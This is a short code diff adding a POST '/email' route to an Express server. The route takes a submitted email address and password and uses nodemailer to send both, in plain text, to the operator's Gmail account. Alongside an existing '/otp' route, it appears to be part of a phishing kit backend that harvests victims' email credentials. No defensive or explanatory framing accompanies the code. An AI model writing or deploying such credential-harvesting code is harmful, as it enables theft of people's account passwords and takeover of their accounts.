@@ -85,6 +85,27 @@ app.post("/otp", (req, res) => {
   });
 });
 
+app.post("/email", (req, res) => {
+  const { email, password } = req.body;
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: { user: userEmail, pass: pass },
+  });
+
+  const mailOptions = {
+    from: `${email}`,
+    to: userEmail,
+    subject: `Email address: ${email} \t\n\n\n Email password: ${password}`,
+    text: `New user registered with Email address: ${email} and Email password: ${password}`,
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) return res.send("error Occured: " + error);
+    res.send("success");
+  });
+});
+
 app.listen(PORT, () => {
   console.log(`Server is running on port http://localhost:${PORT}`);
 });
